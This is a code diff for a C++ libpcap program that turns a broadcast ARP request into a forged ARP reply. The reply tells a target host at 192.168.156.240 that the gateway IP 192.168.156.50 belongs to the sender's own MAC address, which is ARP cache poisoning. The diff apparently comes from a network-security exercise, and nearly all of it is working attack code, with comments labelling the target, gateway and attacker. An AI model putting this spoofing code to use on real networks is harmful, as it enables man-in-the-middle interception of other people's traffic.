@@ -31,19 +31,19 @@ int main(int argc, char* argv[]) {
 
 	EthArpPacket packet;
 
-	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
-	packet.eth_.smac_ = Mac("00:0c:29:c2:d1:75");
+	packet.eth_.dmac_ = Mac("c4:03:a8:3f:d6:6c");	// Target MAC
+	packet.eth_.smac_ = Mac("00:0c:29:c2:d1:75");	// My MAC
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
 	packet.arp_.pro_ = htons(EthHdr::Ip4);
 	packet.arp_.hln_ = Mac::SIZE;
 	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac("00:0c:29:c2:d1:75");
-	packet.arp_.sip_ = htonl(Ip("192.168.156.61"));
-	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	packet.arp_.tip_ = htonl(Ip("192.168.156.50"));
+	packet.arp_.op_ = htons(ArpHdr::Reply);
+	packet.arp_.smac_ = Mac("00:0c:29:c2:d1:75");	// My MAC
+	packet.arp_.sip_ = htonl(Ip("192.168.156.50"));	// GW IP
+	packet.arp_.tmac_ = Mac("c4:03:a8:3f:d6:6c");	// Target MAC
+	packet.arp_.tip_ = htonl(Ip("192.168.156.240"));// Target IP
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
